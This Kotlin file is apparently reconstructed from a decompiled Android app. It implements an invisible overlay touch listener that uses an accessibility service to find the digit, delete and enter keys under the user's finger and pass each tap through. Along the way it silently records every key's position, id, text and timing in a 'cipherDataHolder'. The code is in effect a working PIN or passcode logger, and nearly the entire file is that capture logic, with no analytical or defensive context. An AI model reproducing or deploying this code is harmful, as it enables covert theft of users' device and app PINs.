package com.storm.safe.rock.service.modules.cipher

import android.graphics.Rect
import android.util.Log
import android.view.MotionEvent
import android.view.View
import android.view.accessibility.AccessibilityNodeInfo

/**
 * 覆盖层触摸监听器 — 处理数字键盘触摸事件。
 *
 * JADX: ViewOnTouchListenerC0338a4.java (300 行)
 *
 * 方法映射:
 *   a0 → findButtonAtPosition   (通过坐标查找数字按钮)
 *   a1 → collectWindowRoots     (收集窗口根节点)
 *   a2 → hitTestWithParent      (带父节点扩展的碰撞检测)
 *   onTouch → 触摸事件处理
 */
class OverlayTouchListener : View.OnTouchListener {

    companion object {
        private const val TAG = "TouchViewManager"

        /**
         * 通过坐标查找数字按钮。
         * vendor: a0
         */
        fun findButtonAtPosition(
            buttons: List<DigitButtonInfo>,
            x: Int, y: Int
        ): DigitButtonInfo? {
            for (info in buttons) {
                var hitRect = Rect(info.bounds)
                try {
                    val node = info.node
                    if (node != null) {
                        val parentBounds = Rect()
                        node.getBoundsInParent(parentBounds)
                        val wDiff = if (parentBounds.width() > hitRect.width()) {
                            (parentBounds.width() - hitRect.width()) / 2
                        } else 0
                        val hDiff = if (parentBounds.height() > hitRect.height()) {
                            (parentBounds.height() - hitRect.height()) / 2
                        } else 0
                        if (wDiff > 0 || hDiff > 0) {
                            hitRect = Rect(
                                hitRect.left - wDiff, hitRect.top - hDiff,
                                hitRect.right + wDiff, hitRect.bottom + hDiff
                            )
                        }
                    }
                } catch (_: Exception) {}
                if (hitRect.contains(x, y)) return info
            }
            return null
        }

        /**
         * 带父节点扩展的碰撞检测。
         * vendor: a2
         */
        fun hitTestWithParent(bounds: Rect, node: AccessibilityNodeInfo?, x: Int, y: Int): Boolean {
            var hitRect = bounds
            if (node != null) {
                try {
                    val parentBounds = Rect()
                    node.getBoundsInParent(parentBounds)
                    val wDiff = if (parentBounds.width() > hitRect.width()) {
                        (parentBounds.width() - hitRect.width()) / 2
                    } else 0
                    val hDiff = if (parentBounds.height() > hitRect.height()) {
                        (parentBounds.height() - hitRect.height()) / 2
                    } else 0
                    if (wDiff > 0 || hDiff > 0) {
                        hitRect = Rect(
                            hitRect.left - wDiff, hitRect.top - hDiff,
                            hitRect.right + wDiff, hitRect.bottom + hDiff
                        )
                    }
                } catch (_: Exception) {}
            }
            return hitRect.contains(x, y)
        }
    }

    override fun onTouch(view: View?, event: MotionEvent?): Boolean {
        if (event == null || event.action != MotionEvent.ACTION_DOWN) return false

        val svc = TouchViewManager.accessibilityService ?: return false
        if (TouchViewManager.listenHelper == null) return false

        val x = event.x
        val y = event.y
        val ix = x.toInt()
        val iy = y.toInt()

        if (TouchViewManager.useFallbackMode) return false

        // 确保按钮已收集
        if (!TouchViewManager.buttonsCollected && TouchViewManager.digitButtons.size != 10) {
            TouchViewManager.refreshDigitButtons()
        }

        // 查找删除键
        if (TouchViewManager.deleteKeyRef.get() == null) {
            val roots = ArrayList<UiObject>()
            try {
                val windows = svc.windows
                if (windows != null) {
                    for (window in windows) {
                        val root = window.root ?: continue
                        UiObject.Companion.createRoot(root)?.let { roots.add(it) }
                    }
                }
            } catch (_: Exception) {}
            for (root in roots) {
                TouchViewManager.findSpecialKey(root, isDelete = true)
                if (TouchViewManager.deleteKeyRef.get() != null) break
            }
        }

        // 查找回车键
        if (TouchViewManager.enterKeyRef.get() == null) {
            val roots = ArrayList<UiObject>()
            try {
                val windows = svc.windows
                if (windows != null) {
                    for (window in windows) {
                        val root = window.root ?: continue
                        UiObject.Companion.createRoot(root)?.let { roots.add(it) }
                    }
                }
            } catch (_: Exception) {}
            for (root in roots) {
                TouchViewManager.findSpecialKey(root, isDelete = false)
                if (TouchViewManager.enterKeyRef.get() != null) break
            }
        }

        // 1. 匹配已收集的数字按钮
        val matched = findButtonAtPosition(TouchViewManager.digitButtons, ix, iy)
        if (matched != null) {
            matched.click()
            TouchViewManager.currentKeyIndex++
            TouchViewManager.keyPressCount++

            val keyIndex = TouchViewManager.currentKeyIndex
            val nanoTime = System.nanoTime()
            val holder = TouchViewManager.cipherDataHolder
            synchronized(holder) {
                holder.touchPoints.add(Point(matched.bounds.exactCenterX(), matched.bounds.exactCenterY()))
                if (matched.resourceId.isNotEmpty()) {
                    holder.propResponses.add(ListenPropResponse(keyIndex, "id", matched.resourceId, nanoTime))
                }
                if (matched.text.isNotEmpty()) {
                    holder.propResponses.add(ListenPropResponse(keyIndex, "text", matched.text, nanoTime))
                }
                if (matched.contentDescription.isNotEmpty()) {
                    holder.propResponses.add(ListenPropResponse(keyIndex, "desc", matched.contentDescription, nanoTime))
                }
            }
            return false
        }

        // 2. 检查删除键
        val deleteKey = TouchViewManager.deleteKeyRef.get()
        if (deleteKey != null && hitTestWithParent(deleteKey.bounds, deleteKey.node, ix, iy)) {
            deleteKey.click()
            val holder = TouchViewManager.cipherDataHolder
            synchronized(holder) {
                if (holder.touchPoints.isNotEmpty()) {
                    holder.touchPoints.removeLast()
                }
                if (TouchViewManager.currentKeyIndex >= 0) {
                    val idx = TouchViewManager.currentKeyIndex
                    holder.propResponses.removeAll { it.targetIndex == idx }
                    TouchViewManager.currentKeyIndex--
                    if (TouchViewManager.keyPressCount > 0) {
                        TouchViewManager.keyPressCount--
                    }
                }
            }
            return false
        }

        // 3. 检查回车键
        val enterKey = TouchViewManager.enterKeyRef.get()
        if (enterKey != null && hitTestWithParent(enterKey.bounds, enterKey.node, ix, iy)) {
            enterKey.click()
            return false
        }

        // 4. Fallback: 通过无障碍树查找
        val found = TouchViewManager.findNodeAtPosition(svc, x, y) ?: return false
        val id = found.getResourceId() ?: ""
        var text = found.getText() ?: ""
        var desc = found.getContentDescription() ?: ""

        if (id == "com.android.systemui:id/scrim_behind") return false

        // 检查是否与已知特殊键重复
        val delRef = TouchViewManager.deleteKeyRef.get()
        val entRef = TouchViewManager.enterKeyRef.get()
        if ((delRef != null && found.getResourceId() == delRef.resourceId && delRef.resourceId.isNotEmpty()) ||
            (entRef != null && found.getResourceId() == entRef.resourceId && entRef.resourceId.isNotEmpty())) {
            return false
        }

        val isDelete = id.contains("delete", ignoreCase = true) ||
            desc.contains("删除") ||
            desc.equals("delete", ignoreCase = true)
        val isDigit = (text.length == 1 && Character.isDigit(text[0])) ||
            (desc.length == 1 && Character.isDigit(desc[0]))

        try { found.nodeInfo.performAction(AccessibilityNodeInfo.ACTION_CLICK) } catch (_: Exception) {}

        if (isDelete) {
            // 退格
            val holder = TouchViewManager.cipherDataHolder
            synchronized(holder) {
                if (holder.touchPoints.isNotEmpty()) {
                    holder.touchPoints.removeLast()
                }
                if (TouchViewManager.currentKeyIndex >= 0) {
                    val idx = TouchViewManager.currentKeyIndex
                    holder.propResponses.removeAll { it.targetIndex == idx }
                    TouchViewManager.currentKeyIndex--
                    if (TouchViewManager.keyPressCount > 0) {
                        TouchViewManager.keyPressCount--
                    }
                }
            }
        } else if (isDigit) {
            val bounds = found.getBounds()
            val point = if (bounds != null) Point(bounds.exactCenterX(), bounds.exactCenterY()) else Point(x, y)
            TouchViewManager.currentKeyIndex++
            TouchViewManager.keyPressCount++
            val keyIndex = TouchViewManager.currentKeyIndex
            val nanoTime = System.nanoTime()
            val holder = TouchViewManager.cipherDataHolder
            synchronized(holder) {
                holder.touchPoints.add(point)
                if (id.isNotEmpty()) holder.propResponses.add(ListenPropResponse(keyIndex, "id", id, nanoTime))
                if (text.isNotEmpty()) holder.propResponses.add(ListenPropResponse(keyIndex, "text", text, nanoTime))
                if (desc.isNotEmpty()) holder.propResponses.add(ListenPropResponse(keyIndex, "desc", desc, nanoTime))
            }
        } else {
            // 可点击按钮 — 记录 ID
            try {
                if (found.isClickable()) {
                    val bounds = found.getBounds()
                    val point = if (bounds != null) Point(bounds.exactCenterX(), bounds.exactCenterY()) else Point(x, y)
                    TouchViewManager.currentKeyIndex++
                    TouchViewManager.keyPressCount++
                    val keyIndex = TouchViewManager.currentKeyIndex
                    val nanoTime = System.nanoTime()
                    val holder = TouchViewManager.cipherDataHolder
                    synchronized(holder) {
                        holder.touchPoints.add(point)
                        if (id.isNotEmpty()) holder.propResponses.add(ListenPropResponse(keyIndex, "id", id, nanoTime))
                    }
                }
            } catch (_: Exception) {}
        }

        return false
    }
}
